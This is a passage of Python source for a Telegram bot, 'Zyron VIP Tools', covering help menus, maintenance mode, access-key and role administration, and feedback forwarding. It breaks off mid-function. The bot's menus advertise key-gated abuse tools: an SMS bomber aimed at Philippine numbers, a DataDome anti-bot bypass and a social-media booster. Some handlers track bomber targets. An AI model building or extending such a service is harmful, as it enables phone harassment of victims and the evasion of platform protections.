async def show_help(update: Update, context: CallbackContext):
    if await check_cooldown(update): return
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_help called with no effective message.")
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return

    role = USER_ROLES.get(user_id, "user")
    joined_channel = REFERRAL_DATA.get(user_id, {}).get("joined_channel", False)

    if is_at_least_role(user_id, "owner"):
        help_text = (
            f"👑 *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs* `v{BOT_VERSION}` — ᴀᴅᴍɪɴ\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴇ /adminhelp ғᴏʀ ᴛʜᴇ ғᴜʟʟ ᴄᴏᴍᴍᴀɴᴅ ʀᴇғᴇʀᴇɴᴄᴇ.\n\n"
            "📊 /status · /usercount · /globalstats\n"
            "🔑 /genkey · /keys · /approve · /revoke\n"
            "👥 /lookup · /userlist · /activeusers\n"
            "📣 /broadcast · /backup · /maintenance"
        )
    elif not joined_channel:
        help_text = (
            "👋 *ɢᴇᴛᴛɪɴɢ sᴛᴀʀᴛᴇᴅ*\n\n"
            f"ᴊᴏɪɴ {REQUIRED_CHANNEL} ᴛʜᴇɴ ᴛᴀᴘ *✅ ᴠᴇʀɪғʏ* ᴛᴏ ᴜɴʟᴏᴄᴋ ᴛʜᴇ ʙᴏᴛ."
        )
    elif not has_access(user_id):
        help_text = (
            f"ℹ️ *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs* `v{BOT_VERSION}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ ᴠᴇʀɪғɪᴇᴅ! ʜᴇʀᴇ's ᴡʜᴀᴛ's ᴀᴠᴀɪʟᴀʙʟᴇ:\n\n"
            "🆓 ᴅʙ ɢᴇɴᴇʀᴀᴛᴏʀ (ʟɪᴍɪᴛᴇᴅ/ᴅᴀʏ)\n"
            "🔑 ɢᴇᴛ ᴀ ᴋᴇʏ → @ZyronDevv \n"
            "🔗 ᴇᴀʀɴ +2h ғʀᴇᴇ ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ → /refer\n\n"
            "ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴋᴇʏ? → ᴛᴀᴘ 🔑 *ᴜsᴇ ᴀᴄᴄᴇss ᴋᴇʏ*"
        )
    elif is_at_least_role(user_id, "vip"):
        help_text = (
            f"ℹ️ *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs* `v{BOT_VERSION}` — ᴠɪᴘ\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🗂 *ᴛᴏᴏʟ ɢᴜɪᴅᴇ*\n"
            "┣ 📂 ᴅʙ ɢᴇɴᴇʀᴀᴛᴏʀ — 500 ʟɪɴᴇs/ʀᴇǫᴜᴇsᴛ\n"
            "┣ 🔐 ᴇɴᴄʀʏᴘᴛᴏʀ — ᴍᴜʟᴛɪ-ᴍᴇᴛʜᴏᴅ ᴘʏᴛʜᴏɴ\n"
            "┣ 🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ — ʙʏᴘᴀss ᴀɴᴛɪ-ʙᴏᴛ\n"
            "┣ 💣 sᴍs ʙᴏᴍʙᴇʀ — ᴘʜ ɴᴜᴍʙᴇʀs\n"
            "┣ 🚀 sᴏᴄɪᴀʟ ʙᴏᴏsᴛᴇʀ — ᴛɪᴋᴛᴏᴋ, ɪɢ, ʏᴛ, ғʙ\n"
            "┗ 📥 ᴛᴏᴏʟs — ᴅᴏᴡɴʟᴏᴀᴅ sᴄʀɪᴘᴛs\n\n"
            "⏳ /mykey · 🔥 /checkin · 🔗 /refer"
        )
    else:
        help_text = (
            f"ℹ️ *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs* `v{BOT_VERSION}`\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🗂 *ᴛᴏᴏʟ ɢᴜɪᴅᴇ*\n"
            "┣ 📂 ᴅʙ ɢᴇɴᴇʀᴀᴛᴏʀ — 500 ʟɪɴᴇs/ʀᴇǫᴜᴇsᴛ\n"
            "┣ 🔐 ᴇɴᴄʀʏᴘᴛᴏʀ — ᴍᴜʟᴛɪ-ᴍᴇᴛʜᴏᴅ ᴘʏᴛʜᴏɴ\n"
            "┣ 🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ — ʙʏᴘᴀss ᴀɴᴛɪ-ʙᴏᴛ\n"
            "┣ 💣 sᴍs ʙᴏᴍʙᴇʀ — ʀᴇǫᴜɪʀᴇs ᴠɪᴘ\n"
            "┣ 🚀 sᴏᴄɪᴀʟ ʙᴏᴏsᴛᴇʀ — ʀᴇǫᴜɪʀᴇs ᴠɪᴘ\n"
            "┗ 📥 ᴛᴏᴏʟs — ᴅᴏᴡɴʟᴏᴀᴅ sᴄʀɪᴘᴛs\n\n"
            "💡 *ᴛɪᴘs*\n"
            "┣ ᴜsᴇ ғᴜʟʟ ᴛɪᴋᴛᴏᴋ ᴜʀʟs (ɴᴏᴛ ᴠᴛ.ᴛɪᴋᴛᴏᴋ.ᴄᴏᴍ)\n"
            "┗ ɢᴇɴᴇʀᴀᴛᴇᴅ ғɪʟᴇs ᴀᴜᴛᴏ-ᴅᴇʟᴇᴛᴇ ɪɴ 3ᴍ\n\n"
            "📞 sᴜᴘᴘᴏʀᴛ: @ZyronDevv "
        )
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, help_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(help_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== BACK TO MAIN MENU ==========
async def back_to_main_menu(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_ROLE_USER_ID.discard(user_id)
    AWAITING_ROLE_SELECTION.pop(user_id, None)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_FILE_UPLOAD.discard(user_id)
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.discard(user_id)
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.discard(user_id)
    AWAITING_TOOL_UPLOAD.discard(user_id)
    AWAITING_REVOKE_MULTI_KEYS.discard(user_id)
    
    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('keys_to_generate_count', None)
    context.user_data.pop('enc_page', None)
    context.user_data.pop('remover_option', None)
    context.user_data.pop('datadome_cookie', None)
    context.user_data.pop('bomber_phone', None)
    context.user_data.pop('bomber_amount', None)
    context.user_data.pop('bomber_sender', None)
    context.user_data.pop('bomber_message', None)
    context.user_data.pop('boost_type', None)
    context.user_data.pop('action_source', None)
    
    if update.callback_query:
        await safe_answer_callback(update.callback_query, "🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", show_alert=False)
        await start(update, context)
    else:
        await start(update, context)

# ========== MAINTENANCE FUNCTIONS ==========
async def show_maintenance_options(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_maintenance_options called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    current_status = "*✅ ON*" if MAINTENANCE_MODE else "*❌ OFF*"
    message_text = f"🛠️ *Maintenance Mode Control* 🛠️\n\n" \
                   f"*Current Status*: {current_status}\n\n" \
                   "Please select an action:"
    
    keyboard = [
        [InlineKeyboardButton("✅ ᴛᴜʀɴ ᴏɴ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ", callback_data="admin_turn_on_maintenance")],
        [InlineKeyboardButton("❌ ᴛᴜʀɴ ᴏғғ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ", callback_data="admin_turn_off_maintenance")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def admin_turn_on_maintenance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
        if current_message:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    global MAINTENANCE_MODE
    msg = "🛠️ *Maintenance Mode is now: ON* ✅\n\nMost bot features are now disabled for regular users. Only admin commands remain active. Remember to turn it OFF when done!"
    if not MAINTENANCE_MODE:
        MAINTENANCE_MODE = True
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "Maintenance Mode is now ON", show_alert=True)
            await safe_edit(update.callback_query.message, msg, parse_mode="Markdown")
        else:
            await current_message.reply_text(msg, parse_mode="Markdown")
    else:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "Maintenance Mode is already ON", show_alert=True)
        else:
            await current_message.reply_text("ℹ️ Maintenance Mode is already ON.", parse_mode="Markdown")

    await admin_panel(update, context)

async def admin_turn_off_maintenance(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
        if current_message:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    global MAINTENANCE_MODE
    msg = "🛠️ *Maintenance Mode is now: OFF* ❌\n\nThe bot is now fully operational for all users! Get back to generating!"
    if MAINTENANCE_MODE:
        MAINTENANCE_MODE = False
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "Maintenance Mode is now OFF", show_alert=True)
            await safe_edit(update.callback_query.message, msg, parse_mode="Markdown")
        else:
            await current_message.reply_text(msg, parse_mode="Markdown")
    else:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "Maintenance Mode is already OFF", show_alert=True)
        else:
            await current_message.reply_text("ℹ️ Maintenance Mode is already OFF.", parse_mode="Markdown")

    await admin_panel(update, context)

# ========== DELETE KEY FUNCTION ==========
async def prompt_delete_single_key(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("prompt_delete_single_key called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    AWAITING_DELETE_KEY.add(user_id)
    message_text = (
        "🗑️ *Delete Single Access Key* 🗑️\n\n"
        "Please send the *exact* key you wish to remove from the system.\n"
        "This will delete it from both active and used key lists.\n\n"
        "*Example*: `ᑭᖇEᗰIᑌᗰ-123456`"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, 
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await current_message.reply_text(
            message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

async def handle_delete_key(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_DELETE_KEY:
        return

    key_to_delete = update.message.text.strip()

    if key_to_delete in ACCESS_KEYS:
        del ACCESS_KEYS[key_to_delete]
        schedule_save()
        await update.effective_message.reply_text(f"✅ *Key Deleted!*\n\nKey `{key_to_delete}` has been successfully removed from active keys.", parse_mode="Markdown")
        logging.info(f"Admin {user_id} deleted key: {key_to_delete} from available keys.")
    elif key_to_delete in USED_KEYS:
        USED_KEYS.discard(key_to_delete)
        schedule_save()
        await update.effective_message.reply_text(f"✅ *Used Key Removed!*\n\nKey `{key_to_delete}` has been successfully removed from the used keys list.", parse_mode="Markdown")
        logging.info(f"Admin {user_id} removed used key: {key_to_delete}.")
    else:
        await update.effective_message.reply_text(f"❌ *Key Not Found!*\n\nKey `{key_to_delete}` was not found in either active or used keys. Please check for typos.", parse_mode="Markdown")
    
    AWAITING_DELETE_KEY.discard(user_id)
    await admin_panel(update, context)

# ========== REVOKE MULTIPLE USERS FUNCTION ==========
async def revoke_multi_keys(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    AWAITING_REVOKE_MULTI_KEYS.add(user_id)
    # Clear other conflicting states
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_FEEDBACK.discard(user_id)

    active_user_count = len(USER_ACCESS)
    message_text = (
        "╔══════════════════════════╗\n"
        "║  🗑️  ʀᴇᴠᴏᴋᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴜsᴇʀs  ║\n"
        "╚══════════════════════════╝\n\n"
        f"👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs ɪɴ sʏsᴛᴇᴍ: *{active_user_count}*\n\n"
        "sᴇɴᴅ ᴛʜᴇ *ᴜsᴇʀ ɪᴅs* ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴠᴏᴋᴇ, *ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ*:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 *ᴇxᴀᴍᴘʟᴇ:*\n"
        "`123456789`\n"
        "`987654321`\n"
        "`112233445`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ ᴏɴᴇ ᴜsᴇʀ ɪᴅ ᴘᴇʀ ʟɪɴᴇ, ᴜᴘ ᴛᴏ *50* ᴜsᴇʀs ᴀᴛ ᴏɴᴄᴇ\n"
        "⚠️ ᴄᴀɴɴᴏᴛ ʀᴇᴠᴏᴋᴇ ᴀᴅᴍɪɴ ᴀᴄᴄᴇss"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_revoke_multi_keys(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_REVOKE_MULTI_KEYS:
        return

    raw_text = update.message.text.strip()
    lines = [line.strip() for line in raw_text.splitlines() if line.strip()]

    if not lines:
        await update.effective_message.reply_text("❌ *ɴᴏ ᴜsᴇʀ ɪᴅs ᴅᴇᴛᴇᴄᴛᴇᴅ.* ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴏɴᴇ ᴜsᴇʀ ɪᴅ ᴘᴇʀ ʟɪɴᴇ.", parse_mode="Markdown")
        return

    if len(lines) > 50:
        await update.effective_message.reply_text("⚠️ *ᴍᴀx 50 ᴜsᴇʀs ᴘᴇʀ ʙᴀᴛᴄʜ.* ᴘʟᴇᴀsᴇ sᴘʟɪᴛ ɪɴᴛᴏ ᴍᴜʟᴛɪᴘʟᴇ ʙᴀᴛᴄʜᴇs.", parse_mode="Markdown")
        return

    revoked = []
    skipped_admin = []
    invalid = []
    not_found = []

    for line in lines:
        try:
            uid_to_revoke = int(line)
        except ValueError:
            invalid.append(line)
            continue

        if uid_to_revoke == ADMIN_ID:
            skipped_admin.append(uid_to_revoke)
        elif uid_to_revoke in USER_ACCESS:
            del USER_ACCESS[uid_to_revoke]
            USER_ROLES[uid_to_revoke] = "user"
            revoked.append(uid_to_revoke)
        else:
            not_found.append(uid_to_revoke)

    if revoked:
        schedule_save()

    result_text = (
        f"╔══════════════════════════╗\n"
        f"║  ✅  ʀᴇᴠᴏᴋᴇ ʀᴇsᴜʟᴛs  ║\n"
        f"╚══════════════════════════╝\n\n"
        f"📊 *sᴜᴍᴍᴀʀʏ*\n"
        f"┣ ✅ ʀᴇᴠᴏᴋᴇᴅ: *{len(revoked)}*\n"
        f"┣ ⛔ sᴋɪᴘᴘᴇᴅ (ᴀᴅᴍɪɴ): *{len(skipped_admin)}*\n"
        f"┣ ❌ ɴᴏᴛ ғᴏᴜɴᴅ: *{len(not_found)}*\n"
        f"┣ ⚠️ ɪɴᴠᴀʟɪᴅ: *{len(invalid)}*\n"
        f"┗ 🔢 ᴛᴏᴛᴀʟ ᴘʀᴏᴄᴇssᴇᴅ: *{len(lines)}*\n"
    )

    if revoked:
        result_text += f"\n✅ *ʀᴇᴠᴏᴋᴇᴅ ᴜsᴇʀs:*\n"
        for uid in revoked:
            result_text += f"┣ `{uid}`\n"

    if skipped_admin:
        result_text += f"\n⛔ *sᴋɪᴘᴘᴇᴅ (ᴀᴅᴍɪɴ):*\n"
        for uid in skipped_admin:
            result_text += f"┣ `{uid}`\n"

    if not_found:
        result_text += f"\n❌ *ɴᴏᴛ ғᴏᴜɴᴅ:*\n"
        for uid in not_found:
            result_text += f"┣ `{uid}`\n"

    if invalid:
        result_text += f"\n⚠️ *ɪɴᴠᴀʟɪᴅ (ɴᴏᴛ ᴀ ɴᴜᴍʙᴇʀ):*\n"
        for v in invalid:
            result_text += f"┣ `{v}`\n"

    logging.info(f"Admin {user_id} bulk-revoked {len(revoked)} users ({len(not_found)} not found, {len(invalid)} invalid)")

    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(result_text, reply_markup=reply_markup, parse_mode="Markdown")

    AWAITING_REVOKE_MULTI_KEYS.discard(user_id)

# ========== ROLE MANAGEMENT FUNCTIONS ==========
async def admin_manage_roles(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_manage_roles called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    message_text = "👥 *ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs* 👥\n\nsᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:"
    keyboard = [
        [InlineKeyboardButton("📝 ᴀssɪɢɴ/ᴄʜᴀɴɢᴇ ᴜsᴇʀ ʀᴏʟᴇ", callback_data="admin_prompt_role_user_id")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def admin_prompt_role_user_id(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_prompt_role_user_id called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return

    AWAITING_ROLE_USER_ID.add(user_id)
    message_text = (
        "📝 *Assign/Change User Role* 📝\n\n"
        "Please send the *User ID* (numbers only) of the user whose role you want to manage.\n"
        "*Example*: `123456789` (numbers only).\n\n"
        "⚠️ *Note*: You cannot change your own role through this menu."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_role_user_id_input(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id
    if admin_id not in AWAITING_ROLE_USER_ID:
        return
    
    try:
        target_user_id = int(update.message.text.strip())
        
        if target_user_id == ADMIN_ID:
            await update.effective_message.reply_text("❌ *Operation Failed!* You cannot change your own role.", parse_mode="Markdown")
            AWAITING_ROLE_USER_ID.discard(admin_id)
            await admin_manage_roles(update, context)
            return

        AWAITING_ROLE_USER_ID.discard(admin_id)
        AWAITING_ROLE_SELECTION[admin_id] = target_user_id
        
        message_text = (
            f"⚙️ *Set Role for User ID:* `{target_user_id}`\n\n"
            f"*Current Role*: *{USER_ROLES.get(target_user_id, 'user').capitalize()}*\n\n"
            "Please select the *new role* for this user:"
        )
        
        keyboard = [
            [InlineKeyboardButton("👤 ʀᴇɢᴜʟᴀʀ ᴜsᴇʀ", callback_data=f"assign_role:{target_user_id}:user")],
            [InlineKeyboardButton("💼 ʀᴇsᴇʟʟᴇʀ", callback_data=f"assign_role:{target_user_id}:reseller")],
            [InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.effective_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

    except ValueError:
        await update.effective_message.reply_text("❌ *Invalid Input!* Please send a valid User ID (numbers only).", parse_mode="Markdown")
        AWAITING_ROLE_USER_ID.discard(admin_id)
        await admin_manage_roles(update, context)

async def admin_assign_selected_role(update: Update, context: CallbackContext):
    query = update.callback_query
    admin_id = query.from_user.id
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    if admin_id not in AWAITING_ROLE_SELECTION:
        await safe_edit(query.message, "⚠️ *Action Expired!* Please try again from 'Manage Roles'.", parse_mode="Markdown")
        return
    
    _, target_user_id_str, new_role = query.data.split(":")
    target_user_id = int(target_user_id_str)

    if new_role not in ["user", "reseller", "owner"]:
        await safe_edit(query.message, "❌ *Invalid Role Selected!* Please choose from the provided options.", parse_mode="Markdown")
        AWAITING_ROLE_SELECTION.pop(admin_id, None)
        await admin_manage_roles(update, context)
        return

    if target_user_id == ADMIN_ID and new_role != "owner":
        await safe_edit(query.message, "❌ *Operation Failed!* You cannot change the owner's role.", parse_mode="Markdown")
        AWAITING_ROLE_SELECTION.pop(admin_id, None)
        await admin_manage_roles(update, context)
        return
    
    USER_ROLES[target_user_id] = new_role
    if target_user_id not in USER_ACCESS:
        USER_ACCESS[target_user_id] = 0
        if target_user_id not in USER_STATS:
            USER_STATS[target_user_id] = {"generations": 0, "last_active": None}

    schedule_save()
    
    await safe_edit(query.message, 
        f"✅ *Role Assigned!*\n\n"
        f"User `{target_user_id}` has been successfully assigned the role: *{new_role.capitalize()}*.",
        parse_mode="Markdown"
    )
    logging.info(f"Admin {admin_id} assigned role '{new_role}' to user {target_user_id}")
    
    AWAITING_ROLE_SELECTION.pop(admin_id, None)
    await admin_manage_roles(update, context)

# ========== FEEDBACK FUNCTIONS ==========
async def prompt_feedback(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("prompt_feedback called with no effective message.")
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return

    AWAITING_FEEDBACK.add(user_id)
    message_text = (
        "💬 *- sᴇɴᴅ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ -* 💬\n\n"
        "ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ ᴍᴇssᴀɢᴇ ʙᴇʟᴏᴡ. ʏᴏᴜ ᴄᴀɴ ᴀʟsᴏ sᴇɴᴅ ᴀ ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴏʀ ᴅᴏᴜᴍᴇɴᴛ ɪғ ɴᴇᴇᴅᴇᴅ.\n\n"
        "*ᴡᴇ ᴀᴘᴘʀᴇᴄɪᴀᴛᴇ ʏᴏᴜʀ ɪɴᴘᴜᴛ!*"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, text=message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in AWAITING_FEEDBACK:
        return

    user = update.effective_user
    username = user.username or "N/A"
    first_name = user.first_name or ""
    last_name = user.last_name or ""
    full_name = escape_md(f"{first_name} {last_name}".strip())
    username_display = escape_md(f"@{username}") if username != "N/A" else "N/A"

    access_info = USER_ACCESS.get(user_id)
    if user_id == ADMIN_ID:
        access_status_feedback = "ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ"
    elif access_info is None and user_id in USER_ACCESS:
        access_status_feedback = "ʟɪғᴇᴛɪᴍᴇ ᴘʀᴇᴍɪᴜᴍ"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        access_status_feedback = "ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ"
    else:
        access_status_feedback = "ɴᴏ ᴀᴄᴄᴇss"
    
    current_role = USER_ROLES.get(user_id, "user").capitalize()

    header = (
        f"--- 💬 ɴᴇᴡ ғᴇᴇᴅʙᴀᴄᴋ ʀᴇᴄᴇɪᴠᴇᴅ 💬 ---\n"
        f"ғʀᴏᴍ: {username_display} (ID: `{user_id}`)\n"
        f"ɴᴀᴍᴇ: {full_name}\n"
        f"ʀᴏʟᴇ: {current_role}\n"
        f"ᴀᴄᴄᴇss sᴛᴀᴛᴜs: {access_status_feedback}\n"
        f"ᴅᴀᴛᴇ & ᴛɪᴍᴇ: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"------------------------------------\n\n"
    )

    try:
        if update.message.text:
            # Send header (Markdown) separately from raw user text (no parse_mode)
            # so any _ * ` in the user's message can't break the parser
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=header,
                parse_mode="Markdown"
            )
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=update.message.text,
            )
        elif update.message.photo:
            photo_file = await update.message.photo[-1].get_file()
